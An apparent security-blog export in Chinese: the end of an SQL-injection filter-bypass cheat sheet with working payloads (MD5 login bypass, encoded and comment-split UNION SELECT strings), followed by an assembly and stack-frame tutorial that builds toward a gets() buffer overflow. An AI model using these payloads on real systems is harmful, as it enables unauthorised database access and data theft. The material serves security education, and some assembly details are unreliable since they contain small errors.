绕过检查MD5哈希的登陆界面&emsp;&emsp;如果应用是先通过用户名，读取密码的MD5，然后和你提供的密码的MD5进行比较，那么你就需要一些额外的技巧才能绕过验证。你可以把一个已知明文的MD5哈希和它的明文一起提交，使得程序不使用从数据库中读取的哈希，而使用你提供的哈希进行比较。 绕过MD5哈希检查的例子(MSP) 1234用户名：admin密码：1234 ' AND 1=0 UNION ALL SELECT 'admin','81dc9bdb52d04dc20036dbd8313ed055// 其中81dc9bdb52d04dc20036dbd8313ed055 = MD5(1234) 一些Bypass 大小写混合 大小写绕过用于只针对小写或大写的关键字匹配技术，正则表达式/express/i 大小写不敏感即无法绕过，这是最简单的绕过技术 举例：z.com/index.php?page_id=-15 uNIoN sELecT 1,2,3,4 示例场景可能的情况为filter的规则里有对大小写转换的处理，但不是每个关键字或每种情况都有处理 替换关键字 这种情况下大小写转化无法绕过，而且正则表达式会替换或删除select、union这些关键字，如果只匹配一次就很容易绕过 举例：z.com/index.php?page_id=-15 UNIunionON SELselectECT 1,2,3,4 同样是很基础的技术，有些时候甚至构造得更复杂：SeLSeselectleCTecT，不建议对此抱太大期望 使用编码 URL编码 &emsp;&emsp;在Chrome中输入一个连接，非保留字的字符浏览器会对其URL编码，如空格变为%20、单引号%27、左括号%28、右括号%29普通的URL编码可能无法实现绕过，还存在一种情况URL编码只进行了一次过滤，可以用两次编码绕过： 1page.php?id=1%252f%252a*/UNION%252f%252a /SELECT # 十六进制编码 举例： 12z.com/index.php?page_id=-15 /*!u%6eion*/ /*!se%6cect*/ 1,2,3,4SELECT(extractvalue(0x3C613E61646D696E3C2F613E,0x2f61)) &emsp;&emsp;示例代码中，前者是对单个字符十六进制编码，后者则是对整个字符串编码，使用上来说较少见一点 - Unicode编码 &emsp;&emsp;Unicode有所谓的标准编码和非标准编码，假设我们用的utf-8为标准编码，那么西欧语系所使用的就是非标准编码了 &emsp;&emsp;看一下常用的几个符号的一些Unicode编码： 单引号: `%u0027、%u02b9、%u02bc、%u02c8、%u2032、%uff07、%c0%27、%c0%a7、%e0%80%a7` 空格: `%u0020、%uff00、%c0%20、%c0%a0、%e0%80%a0` 左括号: `%u0028、%uff08、%c0%28、%c0%a8、%e0%80%a8` 右括号: `%u0029、%uff09、%c0%29、%c0%a9、%e0%80%a9` 举例: `?id=10%D6&apos;%20AND%201=2%23` #&apos; &emsp;&emsp;两个示例中，前者利用双字节绕过，比如对单引号转义操作变成\，那么就变成了%D6%5C，%D6%5C构成了一个款字节即Unicode字节，单引号可以正常使用第二个示例使用的是两种不同编码的字符的比较，它们比较的结果可能是True或者False，关键在于Unicode编码种类繁多，基于黑名单的过滤器无法处理所以情况，从而实现绕过&emsp;&emsp;另外平时听得多一点的可能是utf-7的绕过，还有utf-16、utf-32的绕过，后者从成功的实现对google的绕过，有兴趣的朋友可以去了解下常见的编码当然还有二进制、八进制，它们不一定都派得上用场，但后面会提到使用二进制的 例子: 使用注释 看一下常见的用于注释的符号有哪些： //, – , /**/, #, –+,– -, ;，–a 普通注释 举例：z.com/index.php?page_id=-15 %55nION/**/%53ElecT 1,2,3,4 &emsp;&emsp;/**/在构造得查询语句中插入注释，规避对空格的依赖或关键字识别;#、–+用于终结语句的查询 内联注释 &emsp;&emsp;相比普通注释，内联注释用的更多，它有一个特性/!**/只有MySQL能识别 举例:index.php?page_id=-15 /!UNION/ /!SELECT/ 1,2,3 ?page_id=null%0A///!50000%55nIOn//yoyu/all//%0A/!%53eLEct/%0A/nnaa/+1,2,3,4… &emsp;&emsp;两个示例中前者使用内联注释，后者还用到了普通注释。使用注释一个很有用的做法便是对关键字的拆分，要做到这一点后面讨论的特殊符号也能实现，当然前提是包括/、*在内的这些字符能正常使用 等价函数与命令 有些函数或命令因其关键字被检测出来而无法使用，但是在很多情况下可以使用与之等价或类似的代码替代其使用 123456hex()、bin() ==&gt; ascii()sleep() ==&gt;benchmark()concat_ws()==&gt;group_concat()mid()、substr() ==&gt; substring()@@user ==&gt; user()@@datadir ==&gt; datadir() 例如: substring()和substr()无法使用时： 1?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74 1. 特殊符号 利用反引号等符号,或用@定义变量,或用+号连接被拆分的字符串 1. HTTP参数控制 重复发送同一个参数,不太常见 1. 缓冲区溢出 跟基于报错那个差不多 1. 整合绕过 把前面说的合起来 1234z.com/index.php?page_id=-15+and+(select 1)=(Select 0xAA[..(add about 1000 "A")..])+/*!uNIOn*/+/*!SeLECt*/+1,2,3,4id=1/*!UnIoN*/+SeLeCT+1,2,concat(/*!table_name*/)+FrOM /*information_schema*/.tables /*!WHERE */+/ *!TaBlE_ScHeMa*/+like+database() -?id=-725+/*!UNION*/+/*!SELECT*/+1,GrOUp_COnCaT(COLUMN_NAME),3,4,5+FROM+/*!INFORMATION_SCHEM*/.COLUMNS+WHERE+TABLE_NAME=0x41646d696e-- 速记: - 空格过滤: - 注释 - %20 %09 %0a %0d %0b %0c %0d %a0等url编码 - 逗号过滤 - 用JOIN()绕过 - 用select绕过 [参考文章](http://drops.xmd5.com/static/drops/tips-7840.html)]]></content>
      <tags>
        <tag>thinking</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[汇编文档整理]]></title>
    <url>%2F2019%2F12%2F08%2Fassembly%2F</url>
    <content type="text"><![CDATA[前言&emsp;&emsp;本文旨在带领你快速了解汇编的特点以及程序运行的基本过程.让你体验专业而粗暴的攻击方式.下面我们简单介绍一下你需要了解哪些知识. 汇编基础 基本逆向工程 简单调试技巧 函数运行时栈的构造与内存分布 基本Linux基础 缓冲区溢出漏洞利用 本文将对比x86与x86-64程序,即32位与64位,主流机器大部分运行64位程序,但32程序运行的原理十分重要(主要体现在函数调用部分) 建议阅读的资料： 汇编语言(王爽) 此书主要介绍8086汇编,虽然8086已经淘汰,但是对理解计算机驱动层十分有益,笔者花了15天读完,建议阅读 深入理解计算机系统 本书为卡内基梅隆大学教材,内容之精妙无法描述orz,全书732页笔者读了一半,打算多刷几遍,强推!!! 程序员的自我修养 听名字像是颈椎病康复指南之类的书,实际上讲的是编译时链接装载的过程,硬核玩家必看 SICP 这是魔法!!! 希望在你读完这篇文章的时候能够拿下你的第一台主机. 汇编基础为啥要学汇编&emsp;&emsp;汇编是逆向工程的基础,许多人都希望能够破解软件,制作游戏外挂,不花钱冲会员等等,这都属于逆向工程的范畴.逆向工程就是在只有二进制文件的时候,我通过反汇编的手段来从二进制文件获得汇编代码,进而对汇编代码进行反编译得到类C的高级语言,以辅助我们了解程序逻辑,挖掘程序漏洞. &emsp;&emsp;同时,逆向工程是学习C/C++最好的途径.C系语言本就是为了开发Unix而生,因此他完美的契合Unix生态,因此在Linux下你可以轻易的获得一个程序的指令码(opcode),汇编代码,以及未链接的目标文件.而你学到现在可能都不知道main函数有三个参数,为什么main函数一定要写return 0;(虽然你不写,但这是十分差劲的习惯).只有通过阅读汇编代码你才能真正理解程序的运行原理,你才能真正的理解编译的的高明之处,你才能真正领略到前人的伟大智慧.我强烈建议同学们安装ubuntu18.04虚拟机进行实验,这样你才能获得最好的体验. &emsp;&emsp;我知道现在流行一种歪风邪气,由于互联网市场膨胀,资本大量流入,大量公司需求网站开发与移动端开发.因此一些学生急功近利,认为自己会写几行php,套个框架,api倒背如流,就算编程大牛了.认为自己会写几行python java,调一调库,用一用flask spring搭个网站,整天拿一些现有的库高谈扩论,写一些业务逻辑,搞几个微信小程序就算是高级程序员了.反而嘲笑C/C++老掉牙,内心浮躁而不愿了解底层,这本身就是一种自欺欺人.多数人由于畏难心理而拒绝C++,只推崇语法糖更加简单的python.作为计算机科学研究人员,我们决不能满足于只写一些应用层逻辑,只有真正了解了计算机的细节,我们才能成为大师,否则你与专科培训班的学生有什么区别. 从Hello_world开始&emsp;&emsp;你向家里的弟弟妹妹炫耀你的编程技巧时,你可能写过无数次Hello_world来骗他们了,也许你自认为对它十分熟悉,下面我们从头看看到底发生了什么.&emsp;&emsp;首先你会熟练的写一个hello.c: 12345#include&lt;stdio.h&gt;int main(int argc, char *argv[], char *envp[])&#123; printf("Hello World!"); return 0;&#125; &emsp;&emsp;或许你在dev-c++里熟练的按下F11,不过在linux终端里,我们使用GNU开源编译器gcc进行编译,命令如下: 1&gt; gcc -o hello hello.c &emsp;&emsp;在这里,gcc驱动程序读取源程序文件hello.c,并把它翻译成一个可执行的二进制文件,这个翻译过程可分为四个阶段,如下图.这四个阶段的程序(预处理器 编译器 汇编器 链接器)构成了编译系统(Compilation System) 预处理阶段: 预处理器(cpp)根据一字符#开头的命令修改原始C程序.比如hello.c的第一行#include&lt;stdio.h&gt;命令告诉预处理器读取系统头文件stdio.h的内容,并把它直接插入文本程序中.结果就的到了另一个C程序,通常以”.i”作为后缀. 编译阶段: 编译器(ccl)将文本文件hello.i翻译成文本文件hello.s,他包含一个汇编程序,该程序的main函数定义,如下: 1234567main: subq $8, %rsp movl $.LC0, %edi call puts movl $0, %eax addq %8, %rsp ret &emsp;&emsp;2~7行的每一条汇编语句都描述了一条低级机器语言指令,汇编的牛啤之处就在于它为不同的高级语言的不同编译器提供了通用的输出语言,相当与对底层进行了封装,统一了接口.这是很了不起的一项成就. 汇编阶段: 接下来,汇编器(as)将hello.s翻译成机器语言指令,把这些指令打包成可重定位目标程序(relocatable object program)hello.o,hello.o是一个二进制文件,如果你用记事本打开他将看到一堆乱码. 链接阶段: 注意,hello调用了printf函数,这是C标准库所提供的函数,printf存在于一个叫printf.o的单独预编译好了的目标文件中,我们必须使用某种神秘魔法将hello.o与printf.o融合起来,这就是链接器的工作,最后我们就得到了hello文件,这是一个可执行目标文件,可以被加载到内存中,由系统执行. &emsp;&emsp;最后,尝试在Linux终端里运行你的程序:123&gt; ./helloHello World!# &emsp;&emsp;到此为止我们已经稍微了解了Hello_world,当学弟学妹在你面前吹牛的时候,你就可以问他:你知道Hello_world有多复杂吗? 汇编风格&emsp;&emsp;从传统上来说,汇编有两种风格,一种是AT&amp;T风格,一种是Intel风格.AT&amp;T是Linux默认格式,而Intel则是微软默认格式.两种风格没有好坏之分,下面我们介绍一下他们的区别.我们还是以一个程序为例,首先我们写一个mstore.c文件如下:123456long mult2(long, long);void multstore(long x, long y, long *dest) &#123; long t = mult2(x, y); *dest = t;&#125; &emsp;&emsp;接下来,我们编译这个程序,在命令中使用’-S’选项可以生成汇编代码:1&gt; gcc -Og -S mstore.c 此处’-Og’代表不进行优化,编译器会默认对你写的垃圾代码进行优化 &emsp;&emsp;接下来你会发现生成了一个mstore.s,里面有各种声明,但是包括如下几行:12345678;AT&amp;T style:multstore:pushq %rbxmovq %rdx, %rbxcall mult2movq %rax, (%rbx)popq %rbxret &emsp;&emsp;以上代码描述了一系列机器指令,你会注意到里面有各种%rax之类的东西,这些%开头的东西就是寄存器(Register).他们是cpu中的储存单元,cpu所进行的一切进算都必须由寄存器储存,同时它也是速度最高的存储单元.我们可以把寄存器理解为局部变量,他用来存储某个函数调用所需要的数据. &emsp;&emsp;以上这种带%的汇编就是AT&amp;T风格,他的阅读顺序是从左往右,就像是说话一样自然.而pushq movq等等是一些指令,他们实际上就是英文单词push和mov(即move的缩写),至于为什么后面加了一个’q’,是因为q描述了mov后面的数据的大小.q代表”4字”(quad words)即一个64位数,即%rdx与%rbx中存储了long类型的数.而movq %rdx, %rbx的意思就如同字面意思一样,把%rdx里的数据移动到%rbx里.这就好比C语言中的赋值操作:1%rbx = %rdx 注: 由于是从16位体系结构扩展为32位的,Intel使用术语 “字(word)”来表示16位数据. 因此称32位数为”双字(double words)”,称64位数为”4字(quad words)”.在C语言中,int为32位即”双字”,4个字节.大家要清楚一点,位(bit) 字节(byte)在任何情况下都是没有歧义的,一个字节就是8位.但是字(word)随着语境的不同大小会发生变化,在这里特指16位,在其他文章中应根据上下文判断. &emsp;&emsp;接下来我们给出该程序Intel风格的代码:1234567multstore: push rbx mov rbx, rdx call mult2 mov QWRD PTR [rbx], rax pop rbx ret &emsp;&emsp;你可以使用gcc -Og -S -masm=intel mstore.c获得该代码,我们可以看到他与AT&amp;T有以下几点不同: Intel 代码省略了指令的后缀,我们看到push和mov而不是pushq和movq. Intel 代码省略了寄存器前的%,用的是rbx,而不是%rbx Intel 代码用QWRD PTR [rbx]来描述内存中的内容,而不是(%rbx) Intel 代码目标与对象与AT&amp;T的相反,比如mov rbx, rdx等价于rbx = rdx,在AT&amp;T中要写成movq %rdx, %rbx &emsp;&emsp;下面我面介绍一下上面出现的几条指令: mov: 他是一个传递指令,表示把数据从一处传递到另一处,你可以简单把他理解为赋值语句 然而mov的操作对象只有如下几种情况: mov rax, rbx=&gt; rax = rbx 即从寄存器到寄存器 mov [rax], rbx =&gt; *rax = rbx 即从寄存器到内存 mov rax, [rbx] =&gt; rax = *rbx 即从内存到寄存器 mov rax, 3 =&gt; rax = 3即将立即数赋值给rax mov [rax], 3 =&gt; *rax = 3 即将立即数存储在内存 无论如何都不能mov [rax], [rbx] 即不可从内存到内存 至于[rax]是什么东西.[]是寻址运算符号就相当与C语言中的*,他会把[rax]中的rax当作指针,去访问rax储存的地址所指向位置的内容.比如,mov [rax], 3相当于*rax = 3. 更加复杂的寻址方式暂时跳过 push: 相信大家应该都用过C++里面的Vector了,应该都比较熟悉push和pop了.push和pop本就是为了栈(Stack)这种数据结构所设计的,push和pop分别描述了入栈和出栈的操作. &emsp;&emsp;push就是将数据推入栈中,pop则是从栈中弹出.看似简单的数据结构是则是为了适应工业要求而诞生的产物.在同学们的印象里stack似乎是为了做算法题才创造出来的,实则不是,上古时期,科学家在研究函数调用时发现,他们需要一种能够保存当前状态的东西,这样才能实现函数的递归调用.这样解释可能还是有些抽象.我们举个例子,相信大家都看过&lt;&lt;盗梦空间&gt;&gt;这部电影,我们可以在梦里做梦,深入好几层梦境,其实这就类似与函数的递归,但是如果想要进入下一层梦境,你就必须要储存好当前的状态,这样一来,当你每次醒来时,你都处在之前保存好的状态之中.对于函数而言,每次从内层调用中返回,你都要恢复调用之前的状态,例如:12345int A()&#123; B(); b = a + 1; return b;&#125; &emsp;&emsp;我们看到A()函数调用了B();那么我们首先要清楚一件事,当B()运行结束之后会发生什么? &emsp;&emsp;显然要接着继续执行A()后面的指令,那么我们要怎样才能在B()运行结束后回到A()内并继续执行b = a + 1呢?很显然,我们必须在执行B()之前就提前保存好当前的所有状态,并且把B()返回后要执行的下一条指令提前储存起来.这样我们才能在每一次函数调用结束后回到原来的位置并继续向下执行. &emsp;&emsp;想到这里,似乎stack就是最好的实现方式.在每一次进行函数调用的时候就把当前的相关寄存器的值push进stack,并且把被调函数结束后的返回地址也push进stack,这样以来,当函数结束时,我们只需要把相关数据再pop到对应的寄存器,我们就相当于恢复了调用前的状态,类似于游戏的”存档与读档”的操作.如果我们要实现递归调用,那么我们只需要在每一次调用时建立起新的stack frame即栈帧,每个函数都有自己的栈帧,每个栈帧存储着对应函数调用的数据.因此我们只需要一直push,为每次递归建立新的栈帧,在返回时将对应栈帧的内容pop出来就能完美的实现递归调用. 对于栈本身而言,它是人为规定的出来的.我相信很多人仍这种误解:他们认为stack实际存在与计算机中,他们还信誓旦旦的说内存里还有堆(heap),每次malloc或者new就会从堆里面开辟空间,而函数却只会开栈,所以栈和堆实际存在. 这种想法是极端错误的,产生这种想法的原因是老师上课讲的比较笼统,而且他们确实是这么说的…其实,stack与heap并不存在,他们是我们人为从内存里划分一部分并且给他们取名叫stack或者heap,他们与其他内存空间并没有本质区别,并不是说内存中的某一段天生就具有push和pop的特效,或者说只是由于前辈使用了一些黑魔法才把普通的内存搞出了stack的功能. 按照规矩,我们更应该称之为Stack Segment即”栈段”以及Heap Segment即”堆段”,因为stack与heap都是内存上的一段.实际上在程序运行时会创建许多的段(segment),比如代码段(Text Segment) BSS段(BSS Segment)等等.我想大家在C/C++编程时经常看到segment这个单词只是你没有留意.一般,你如果产生了内存错误,比如越界访问,就会导致Segment Fault,即”段错误”,国内一个还算不错的代码论坛”思否”正是取名于此.下面给大家一个内存宏观图: &emsp;&emsp;我们在这里只是简单的介绍一下原理,更多的细节在后面会分析. call: 正如其字面意思,就是调用某个函数的意思,其参数是一段地址 pop: 其参数应为应为某寄存器,效果是将栈顶数据弹出至目标寄存器. ret: 即函数返回 这里又要强调一下,有一个错误观点:许多人认为函数没有返回值就不需要返回.这个观点是极端错误的.返回的真正意义是:当前被调用函数(called function)执行结束后,回到上层调用函数(callee function)的过程.而返回值仅仅是函数向外层传递出的结果,函数会把想要传递出的结果在返回之前放入%rax寄存器,这个值就叫返回值. 实际上ret等价于pop %rip 这里很重要,后文会详细说明. 关于常用寄存器介绍&emsp;&emsp;cpu的一切活动都是基于寄存器的,你可以把寄存器理解为变量,函数运行所产生的中间变量优先使用寄存器存储,若寄存器存不下则存入内存即栈中,或者用户主动选择分配一段内存即在堆区分配内存用于存储数据. &emsp;&emsp;先给大家一张寄存器的图: &emsp;&emsp;我们可以看到图中写了一些你根本看不懂的东西(%rax之类的),那就是寄存器的名字,首先这附图的最右边介绍了各种寄存器的作用,比如%rax的作用是储存”Return value”,即储存返回值.接着我们看图的最上面写着几个神秘数字0 7 8 15 31 63,这一串神秘数字代表了寄存器的大小,你可以清楚的看到,当寄存器的大小不同时,他们的名字似乎不太一样.比如%rax包括了%eax,而%eax包括了%ax,%ax又包括了%ah和%al.为啥好端端的寄存器要分这么细呀?这是由于历史原因造成的. &emsp;&emsp;传说,在上古时期,人们还处于只有16位cpu的蛮荒时代,上古大神编程也使用8086汇编.那个时候一个寄存器的大小最大也只有16位,就是上图%ax %bx那一列.可见古代程序员编程条件比较艰苦,虽然寄存器只有16位,但是他们又想实现一些黑魔法来优化算法,这就需要更加细致的操作寄存器,因此他们又把寄存器分成了高8位与低8位两部分,即%ah与%al. 顺便一提:那个时候,想要访问内存是一件很繁琐的事情,由于当时的寄存器只有16位,但是地址的寻址范围确实20位,也就是说一个寄存器是存不下一个完整的地址的,因此大佬们决定用两个寄存器存地址,他们决定用”基址+偏移”的方式储存地址.好了我知道你开始听不懂了,举个栗子: 从郊区9斋到老麻抄手距离8848km,到逸夫楼8000Km,现在我有个要求:你只用两个寄存器,每个寄存器不超过三位,让你几下这个距离.你如何操作? 凡夫俗子: 这还不简单,直接从中间分开呗? 88 48 俩数,一个才两位,我真nb 大佬: 优化一下 800 848 (真实地址 = 基地址偏移+偏移地址) `800 10 + 848` &emsp;&emsp;其实道理很简单,正常人简单的把十进制数分成两半实际上也是基址+偏移的一种,但是由于设计错误,导致基址和偏移要同时发生改变.比如,假如今天想换个口味,想吃九本拉面了,距离变成了8747Km,87 47相对于88 48变了两个数.而800 848相对于800 747来说只变了一个偏移,这样就可以减少一次修改寄存器的操作. 这种寻址方式称之为”间址寻址”(因为是间接的嘛),由于现在的寄存器都容量很大所以这种寻址方式变得不再常见,但是这种神奇的思想依然十分重要,在函数建立栈帧的时候依然使用间址寻址的方式,请大家反复思索并理解. &emsp;&emsp;如今大家的程序基本都是64位的,即x86-64所以寄存器一般是”r”开头的,比如%rax之类的,四五年前流行32位的程序,即x86,寄存器大小一般是32位,以”e”开头,比如%eax.如今的机器为了向下兼容以前的程序,仍然保留之前的寄存器模型,所以%rax的低32位仍然是%eax,就像图中显示的那样. &emsp;&emsp;有些寄存器具有特殊的功能,比如%rip %rsp %rbp等等,稍微介绍一下: %rip: 指令指针(Instruction Pointer)寄存器,因此在8086中被缩写为ip,32位时为%eip. 作用是存储下一条要执行的指令的地址 敲重点! 假如能够修改这个寄存器,那么我们似乎就可以控制程序流程,进而控制整个计算机系统 你不能像访问通用寄存器那样访问它,即找不到可用来寻址EIP并对其进行读写的操作码(OpCode).EIP可被jmp、call和ret等指令隐含地改变(事实上它一直都在改变). %rsp: 栈顶指针(Stack Pointer)寄存器,8086中为sp,32位为%esp 众所周知stack具有底(第一个入栈的)和顶(最后一个入栈的),rsp指向栈顶 %rbp: 栈基指针(Base Pointer)寄存器,8086中为bp,32位为%ebp 与%rsp对应,%rbp指向栈底 也就是说这俩寄存器指向内存中的栈段(stack segment) %rdi %rsi %rdx %rcx %r8 %r9: 在x86-64位程序中,分别是调用函数时传递参数时使用的,若有更多参数,则存入栈中.例如: printf(&quot;%d %d %d %d %d %d %d&quot;,1,2,3,4,5,6,7);则1-6分别存在%rdi - %r9中,’7’则存于栈上. 需要注意的是x86程序,即32位程序的传参方式与64位区别很大,32位程序的参数传递完全依靠栈. 扩展阅读 为了访问函数局部变量，必须能定位每个变量。局部变量相对于堆栈指针ESP的位置在进入函数时就已确定，理论上变量可用ESP加偏移量来引用，但ESP会在函数执行期随变量的压栈和出栈而变动。尽管某些情况下编译器能跟踪栈中的变量操作以修正偏移量，但要引入可观的管理开销。而且在有些机器上(如Intel处理器)，用ESP加偏移量来访问一个变量需要多条指令才能实现。 因此，许多编译器使用帧指针寄存器FP(Frame Pointer)记录栈帧基地址。局部变量和函数参数都可通过帧指针引用，因为它们到FP的距离不会受到压栈和出栈操作的影响。有些资料将帧指针称作局部基指针(LB-local base pointer)。 在Intel CPU中，寄存器BP(EBP)用作帧指针。在Motorola CPU中，除A7(堆栈指针SP)外的任何地址寄存器都可用作FP。当堆栈向下(低地址)增长时，以FP地址为基准，函数参数的偏移量是正值，而局部变量的偏移量是负值。 请同学们务必记牢我上面提到的寄存器的作用,都是英文缩写,不难记. 常用指令&emsp;&emsp;基本的指令其实没有几条,上面已经介绍不少了,我们再介绍几个常用的就可以开始实战了,下面我们看个例子: &emsp;&emsp;首先可以告诉大家这个程序是有严重漏洞的,可以导致系统被”get shell”(就是说拿到最高控制权限啦). &emsp;&emsp;这是老师课件上的例题,这就是教科书式的漏洞,这段程序与上边的汇编的区别就是输出的方式不同,汇编里用的puts()函数,下面使用了for loop进行输出.其他的基本一致.漏洞就发生在被标红的gets函数那里,我记得这一课讲的是如何把输入的空格读进来,因为cin不行,所以选择了gets()函数.在此强调: 永远都不要使用gets()函数,他对输入长度没有限制与检查,会爆栈,造成严重的缓冲区溢出. 为了让大家体验到这种漏洞的严重性,我决定一会就让大家攻击这个”模范”程序进行实验. &emsp;&emsp;介绍一下,剩下几个指令: sub: 故名思意,减的意思.sub eax, 0xc 就是eax = eax - 0xc的意思 AT&amp;T写法:sub $0xc, %eax 注:’$’开头的东西叫”立即数”,就是常数 add: 与sub同理,不再赘述 lea:这个指令比较神奇,她叫做”加载有效地址(Load Effective Address)”,其实就是C/C++里的取址操作,例如: lea eax, 13(esp)等价于eax = *(esp-13) lea还可以用于简单的算数计算,例如: lea rax, (rdi,rsi,4)等价于rax = rdi + rsi * 4 nop: 啥也不干…理论上等价于….mov eax, eax ,主要起到延时的作用. jmp: 故名思意,jump跳转的意思,用法jmp 0x400ac,意思是跳转到0x400ac这个地放执行指令. jmp一般会出现在: if-else语句 goto语句 各种loop 同系列还有je jne jle jge jl jg,他们是”条件跳转”,若等于则跳转,若不等于则跳转,若小于等于则跳转,若大于等于则跳转……..自行脑补 汇编中,循环一般使用jmp进行实现,其实就是jmp到循环开始的地方 cmp: compare比较的意思,就是比较一下两个对象是否相等,用法:cmp eax, 1比较eax是否等于1,一般用于if-else语句,循环判断等等… 我只是粗略的介绍了一下各种指令,如果你想要深入学习可以读&lt;&lt;汇编语言&gt;&gt;王爽的那本,下面给一个汇编教程网站Assembly Language,质量挺好. &emsp;&emsp;放一下上面那段程序的AT&amp;T代码: 接下来我们进行重点讲解,函数调用时栈的构造与内存变化及传参方式. 函数调用时栈的构造&emsp;&emsp;程序本身就是各种函数的组合,因此了解函数的运行原理极为重要,这一部分是我们日后实施攻击的关键. 关于寄存器使用的约定: &emsp;&emsp;程序寄存器组是唯一能被所有函数共享的资源。虽然某一时刻只有一个函数在执行，但需保证当某个函数调用其他函数时，被调函数不会修改或覆盖主调函数稍后会使用到的寄存器值。因此，IA32采用一套统一的寄存器使用约定，所有函数(包括库函数)调用都必须遵守该约定。&emsp;&emsp;根据惯例，寄存器%eax、%edx和%ecx为主调函数保存寄存器(caller-saved registers)，当函数调用时，若主调函数希望保持这些寄存器的值，则必须在调用前显式地将其保存在栈中；被调函数可以覆盖这些寄存器，而不会破坏主调函数所需的数据。寄存器%ebx、%esi和%edi为被调函数保存寄存器(callee-saved registers)，即被调函数在覆盖这些寄存器的值时，必须先将寄存器原值压入栈中保存起来，并在函数返回前从栈中恢复其原值，因为主调函数可能也在使用这些寄存器。此外，被调函数必须保持寄存器%ebp和%esp，并在函数返回后将其恢复到调用前的值，亦即必须恢复主调函数的栈帧。&emsp;&emsp;当然，这些工作都由编译器在幕后进行。不过在编写汇编程序时应注意遵守上述惯例。 栈帧结构: &emsp;&emsp;函数调用经常是嵌套的，在同一时刻，堆栈中会有多个函数的信息。每个未完成运行的函数占用一个独立的连续区域，称作栈帧(Stack Frame)。栈帧是堆栈的逻辑片段，当调用函数时逻辑栈帧被压入堆栈, 当函数返回时逻辑栈帧被从堆栈中弹出。栈帧存放着函数参数，局部变量及恢复前一栈帧所需要的数据等。 &emsp;&emsp;编译器利用栈帧，使得函数参数和函数中局部变量的分配与释放对程序员透明。编译器将控制权移交函数本身之前，插入特定代码将函数参数压入栈帧中，并分配足够的内存空间用于存放函数中的局部变量。使用栈帧的一个好处是使得递归变为可能，因为对函数的每次递归调用，都会分配给该函数一个新的栈帧，这样就巧妙地隔离当前调用与上次调用。 &emsp;&emsp;栈帧的边界由栈帧基地址指针EBP和堆栈指针ESP界定(指针存放在相应寄存器中)。EBP指向当前栈帧底部(高地址)，在当前栈帧内位置固定；ESP指向当前栈帧顶部(低地址)，当程序执行时ESP会随着数据的入栈和出栈而移动。因此函数中对大部分数据的访问都基于EBP进行。 &emsp;&emsp;为更具描述性，以下称EBP为帧基指针， ESP为栈顶指针，并在引用汇编代码时分别记为%ebp和%esp。 &emsp;&emsp;函数调用栈的典型内存布局如下图所示： &emsp;&emsp;图中给出主调函数(caller)和被调函数(callee)的栈帧布局，”m(%ebp)”表示以EBP为基地址、偏移量为m字节的内存空间(中的内容)。该图基于两个假设：第一，函数返回值不是结构体或联合体，否则第一个参数将位于”12(%ebp)” 处；第二，每个参数都是4字节大小(栈的粒度为4字节)。在本文后续章节将就参数的传递和大小问题做进一步的探讨。 此外，函数可以没有参数和局部变量，故图中“Argument(参数)”和“Local Variable(局部变量)”不是函数栈帧结构的必需部分。 &emsp;&emsp;从图中可以看出，函数调用时入栈顺序为: 实参N~1→主调函数返回地址→主调函数帧基指针EBP→被调函数局部变量1~N &emsp;&emsp;其中，主调函数将参数按照调用约定依次入栈(图中为从右到左)，然后将指令指针EIP入栈以保存主调函数的返回地址(下一条待执行指令的地址)。进入被调函数时，被调函数将主调函数的帧基指针EBP入栈，并将主调函数的栈顶指针ESP值赋给被调函数的EBP(作为被调函数的栈底)，接着改变ESP值来为函数局部变量预留空间。此时被调函数帧基指针指向被调函数的栈底。以该地址为基准，向上(栈底方向)可获取主调函数的返回地址、参数值，向下(栈顶方向)能获取被调函数的局部变量值，而该地址处又存放着上一层主调函数的帧基指针值。本级调用结束后，将EBP指针值赋给ESP，使ESP再次指向被调函数栈底以释放局部变量；再将已压栈的主调函数帧基指针弹出到EBP，并弹出返回地址到EIP。ESP继续上移越过参数，最终回到函数调用前的状态，即恢复原来主调函数的栈帧。如此递归便形成函数调用栈。 &emsp;&emsp;EBP指针在当前函数运行过程中(未调用其他函数时)保持不变。在函数调用前，ESP指针指向栈顶地址，也是栈底地址。在函数完成现场保护之类的初始化工作后，ESP会始终指向当前函数栈帧的栈顶，此时，若当前函数又调用另一个函数，则会将此时的EBP视为旧EBP压栈，而与新调用函数有关的内容会从当前ESP所指向位置开始压栈。 &emsp;&emsp;若需在函数中保存被调函数保存寄存器(如ESI、EDI)，则编译器在保存EBP值时进行保存，或延迟保存直到局部变量空间被分配。在栈帧中并未为被调函数保存寄存器的空间指定标准的存储位置。包含寄存器和临时变量的函数调用栈布局可能如下图所示： 在多线程(任务)环境，栈顶指针指向的存储器区域就是当前使用的堆栈。切换线程的一个重要工作，就是将栈顶指针设为当前线程的堆栈栈顶地址。 &emsp;&emsp;内存地址从栈底到栈顶递减，压栈就是把ESP指针逐渐往地低址移动的过程。而结构体tStrt中的成员变量memberX地址=tStrt首地址+(memberX偏移量)，即越靠近tStrt首地址的成员变量其内存地址越小。因此，结构体成员变量的入栈顺序与其在结构体中声明的顺序相反。 &emsp;&emsp;函数调用以值传递时，传入的实参(locMain1~3)与被调函数内操作的形参(para1~3)两者存储地址不同，因此被调函数无法直接修改主调函数实参值(对形参的操作相当于修改实参的副本)。为达到修改目的，需要向被调函数传递实参变量的指针(即变量的地址)。 &emsp;&emsp;此外，”[locMain1,2,3] = [0, 0, 3]”是因为对四字节参数locMain2调用memset函数时，会从低地址向高地址连续清零8个字节，从而误将位于高地址locMain1清零。 &emsp;&emsp;注意，局部变量的布局依赖于编译器实现等因素。因此，当StackFrameContent函数中删除打印语句时，变量locVar3、locVar2和locVar1可能按照从高到低的顺序依次存储！而且，局部变量并不总在栈中，有时出于性能(速度)考虑会存放在寄存器中。数组/结构体型的局部变量通常分配在栈内存中。 扩展阅读函数局部变量布局方式 与函数调用约定规定参数如何传入不同，局部变量以何种方式布局并未规定。编译器计算函数局部变量所需要的空间总数，并确定这些变量存储在寄存器上还是分配在程序栈上(甚至被优化掉)——某些处理器并没有堆栈。局部变量的空间分配与主调函数和被调函数无关，仅仅从函数源代码上无法确定该函数的局部变量分布情况。基于不同的编译器版本(gcc3.4中局部变量按照定义顺序依次入栈，gcc4及以上版本则不定)、优化级别、目标处理器架构、栈安全性等，相邻定义的两个变量在内存位置上可能相邻，也可能不相邻，前后关系也不固定。若要确保两个对象在内存上相邻且前后关系固定，可使用结构体或数组定义。 Stack的变化 首先以32位程序为例. 函数调用时的具体步骤如下： 